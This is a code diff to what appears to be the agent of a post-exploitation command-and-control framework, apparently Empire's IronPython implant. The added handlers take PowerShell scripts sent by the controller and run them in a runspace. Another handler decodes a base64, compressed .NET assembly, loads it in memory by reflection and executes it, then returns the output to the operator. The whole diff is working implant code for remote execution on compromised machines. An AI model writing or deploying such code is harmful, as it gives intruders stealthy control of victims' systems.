@@ -192,7 +192,6 @@ def process_tasking(data):
     try:
         # aes_decrypt_and_verify is in stager.py
         tasking = aes_decrypt_and_verify(key, data).encode('UTF-8')
-
         (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking)
 
         # if we get to this point, we have a legit tasking so reset missedCheckins
@@ -219,6 +218,7 @@ def process_tasking(data):
         send_message(resultPackets)
 
     except Exception as e:
+        print(e)
         # print "processTasking exception:",e
         pass
 
@@ -461,8 +461,115 @@ def process_packet(packetType, data, resultID):
 
     elif packetType == 111:
         # TASK_CMD_JOB_SAVE
-        # TODO: implement job structure
         pass
+
+    elif packetType == 112:
+        data = data.lstrip("\x00")
+
+        # powershell task
+        myrunspace = Runspaces.RunspaceFactory.CreateRunspace()
+        myrunspace.Open()
+        pipeline = myrunspace.CreatePipeline()
+        pipeline.Commands.AddScript(data)
+        results = pipeline.Invoke()
+        buffer = StringIO()
+        sys.stdout = buffer
+        for result in results:
+            print(result)
+        sys.stdout = sys.__stdout__
+        result_packet = build_response_packet(110, str(buffer.getvalue()), resultID)
+        process_job_tasking(result_packet)
+
+    elif packetType == 118:
+        # dynamic code execution, wait for output, don't save output
+        try:
+            data = data.lstrip("\x00")
+
+            # powershell task
+            myrunspace = Runspaces.RunspaceFactory.CreateRunspace()
+            myrunspace.Open()
+            pipeline = myrunspace.CreatePipeline()
+            pipeline.Commands.AddScript(data)
+            pipeline.Commands.Add('Out-String')
+            results = pipeline.Invoke()
+
+            for result in results:
+                print(result)
+
+            result_packet = build_response_packet(110, str(result), resultID)
+            process_job_tasking(result_packet)
+
+        except Exception as e:
+            print(e)
+            send_message(build_response_packet(0, "error executing specified Python data %s " % (e), resultID))
+
+    elif packetType == 119:
+        pass
+
+    elif packetType == 44:
+        # run csharp module in ironpython using reflection
+        try:
+            import zlib
+
+            import System.IO
+            from System import Array, Byte, Char, Console, Object, String, Text
+            from System.IO import Compression, MemoryStream, StreamWriter
+            from System.Reflection import Assembly
+            from System.Text import Encoding
+
+            parts = data.split(',')
+            params = parts[1:len(parts)]
+            data_bytes = base64.b64decode(parts[0])
+
+            params = ' '.join(params)
+            decoded_data = zlib.decompress(data_bytes, -15)
+            assemBytes = Array[Byte](decoded_data)
+            assembly = Assembly.Load(assemBytes)
+
+            strmprop = assembly.GetType("Task").GetProperty("OutputStream")
+            if not strmprop:
+                print("no output pipe")
+                results = assembly.GetType('Task').GetMethod('Execute').Invoke(None, params)
+                result_packet = build_response_packet(110, str(results), resultID)
+                process_job_tasking(result_packet)
+
+            else:
+                def csharp_job_func(decoded_data, params, pipeClientStream):
+                    assemBytes = Array[Byte](decoded_data)
+                    assembly = Assembly.Load(assemBytes)
+
+                    strmprop = assembly.GetType("Task").GetProperty("OutputStream")
+                    strmprop.SetValue(None, pipeClientStream, None)
+                    assembly.GetType("Task").GetMethod("Execute").Invoke(None, Array[Object]({params}))
+                    pipeClientStream.Dispose()
+
+                print('output pipe')
+                clr.AddReference('System.Core')
+                import System.IO.HandleInheritability
+                import System.IO.Pipes
+
+                pipeServerStream = System.IO.Pipes.AnonymousPipeServerStream(System.IO.Pipes.PipeDirection.In, System.IO.HandleInheritability.Inheritable)
+                pipeClientStream = System.IO.Pipes.AnonymousPipeClientStream(System.IO.Pipes.PipeDirection.Out, pipeServerStream.GetClientHandleAsString())
+                streamReader = System.IO.StreamReader(pipeServerStream)
+
+                task_thread = KThread(target=csharp_job_func, args=(decoded_data, params, pipeClientStream,))
+
+                pipeOutput = Text.StringBuilder()
+                read = Array[Char](pipeServerStream.InBufferSize)
+
+                task_thread.start()
+                count = 1
+                while count > 0:
+                    time.sleep(1)
+                    count = streamReader.Read(read, 0, read.Length)
+                    stream_text = read[0:count]
+                    pipeOutput.Append(stream_text)
+
+                result_packet = build_response_packet(110, str(pipeOutput), resultID)
+                process_job_tasking(result_packet)
+
+        except Exception as e:
+            send_message(build_response_packet(0, "error executing specified Python data %s " % (e), resultID))
 
     elif packetType == 121:
         # base64 decode the script and execute
@@ -853,7 +960,6 @@ def job_func(resultID):
         p = "error executing specified Python job data: " + str(e)
         result = build_response_packet(0, p, resultID)
         process_job_tasking(result)
-
 
 def job_message_buffer(message):
     # Supports job messages for checkin
